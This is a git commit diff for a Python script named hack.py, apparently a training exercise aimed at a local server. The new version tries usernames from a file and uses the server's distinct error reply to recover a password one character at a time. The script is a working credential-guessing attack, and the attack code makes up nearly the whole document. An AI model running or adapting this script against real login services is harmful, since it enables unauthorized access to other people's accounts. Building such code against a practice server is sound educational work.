1285e7b9921ec5fc0ab215151d399f543fd4b621
ugrak <augrak@yandex.ru>
2021-10-01 13:42:39 +0300

    Fourth stage, added logins.txt

--- hack.py
+++ hack.py
@@ -1,32 +1,42 @@
 import sys
 import socket
-from itertools import product
+import json
 from path import file_path
 
 
-def pass_gen():  # The generator will sort through all the variants of upper and lower letters in a word from file
+def send_and_receive(login, password):
+    json_req = json.dumps({'login': login, 'password': password})
+    client_socket.send(json_req.encode())
+    return client_socket.recv(256).decode()
+
+
+def find_login():
     with open(file_path, 'r') as file:
-        for line in file:
-            pass_list = []
-            for letter in line.strip():
-                pass_list.append(letter.lower() + letter.upper())
-            for i in product(*pass_list):
-                yield ''.join(i)
+        for login in file:
+            if send_and_receive(login.strip(), '') == '{"result": "Exception happened during login"}':
+                break
+        return login.strip()
 
 
-if len(sys.argv) < 3:  # Running the program should look like "python3 hack.py localhost 9090"
-    print('Input: IP address and port for sending')
-    sys.exit(1)
-ip, port = sys.argv[1], int(sys.argv[2])
+def find_pass(login):
+    password = ''
+    flag = False
+    chars = [chr(i) for i in range(65, 91)] + [chr(i) for i in range(61, 123)] + [chr(i) for i in range(48, 58)]
+    while not flag:
+        for ch in chars:
+            response = send_and_receive(login.strip(), password + ch)
+            if response == '{"result": "Connection success!"}':
+                return json.dumps({'login': login, 'password': password + ch})
+            elif response == '{"result": "Exception happened during login"}':
+                password += ch
 
-gen = pass_gen()
-with socket.socket() as client_socket:
-    client_socket.connect((ip, port))
-    while True:
-        message = next(gen)
-        client_socket.send(message.encode())
-        response = client_socket.recv(256).decode()
-        if response == 'Connection success!':
-            client_socket.close()
-            break
-print(message)
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:  # Running the program should look like "python3 hack.py localhost 9090"
+        print('Input: IP address and port for sending')
+        sys.exit(1)
+    ip, port = sys.argv[1], int(sys.argv[2])
+
+    with socket.socket() as client_socket:
+        client_socket.connect((ip, port))
+        print(find_pass(find_login()))
